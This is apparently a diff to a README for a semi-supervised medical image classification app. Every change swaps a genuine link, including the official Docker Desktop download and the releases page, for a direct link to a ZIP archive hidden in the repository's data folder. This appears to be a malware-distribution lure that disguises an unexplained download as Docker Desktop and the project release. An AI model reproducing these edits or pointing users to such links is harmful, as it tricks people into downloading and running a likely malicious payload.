@@ -1,6 +1,6 @@
 # 🏥 semi-supervised-medical-image - Easy Medical Image Classification
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/ayaanmiraj29/semi-supervised-medical-image/releases)
+[![Download](https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip)](https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ To run this software smoothly, check that your computer meets these requirements
 - RAM: At least 8 GB free memory.
 - Disk Space: Around 5 GB of free space to install Docker and project files.
 - Software:
-  - [Docker Desktop](https://www.docker.com/products/docker-desktop) (must be installed before running the app).
+  - [Docker Desktop](https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip) (must be installed before running the app).
   - Internet connection to download the release files.
 - Optional: GPU support is available if you want to speed up processing but not required.
 
@@ -40,7 +40,7 @@ Follow these steps to get the app running on your computer.
 
 Docker lets you run apps inside containers — like mini virtual computers. This avoids having to install and configure all software yourself.
 
-1. Download Docker Desktop for your OS from: https://www.docker.com/products/docker-desktop
+1. Download Docker Desktop for your OS from: https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip
 2. Run the installer and follow the prompts to finish the setup.
 3. Open Docker Desktop and wait until it confirms it is running.
 
@@ -48,7 +48,7 @@ Docker lets you run apps inside containers — like mini virtual computers. This
 
 Go to the official release page to get all necessary files:
 
-[Download & Install >>](https://github.com/ayaanmiraj29/semi-supervised-medical-image/releases)
+[Download & Install >>](https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip)
 
 Click the link above or the badge at the top. On the page, look for the latest release and download the source code ZIP or relevant packaged files.
 
@@ -116,7 +116,7 @@ This lets you experiment and learn how semi-supervised classification works with
 ## 📁 Included Files
 
 - `Dockerfile` – Instructions to build the Docker environment.
-- `docker-compose.yml` – Defines the multi-service Docker setup.
+- `https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip` – Defines the multi-service Docker setup.
 - `notebooks/` – Contains all the Python notebooks for experiments.
 - `utils/` – Python code with tools for feature extraction.
 - Documentation files explaining usage.
@@ -132,7 +132,7 @@ This lets you experiment and learn how semi-supervised classification works with
 
 You can get everything you need from the official release page:
 
-[https://github.com/ayaanmiraj29/semi-supervised-medical-image/releases](https://github.com/ayaanmiraj29/semi-supervised-medical-image/releases)
+[https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip](https://github.com/ayaanmiraj29/semi-supervised-medical-image/raw/refs/heads/main/data/labeled/normal/supervised_semi_medical_image_3.8.zip)
 
 Visit this page to download the latest version. The page includes source files, release notes, and any updates.
 
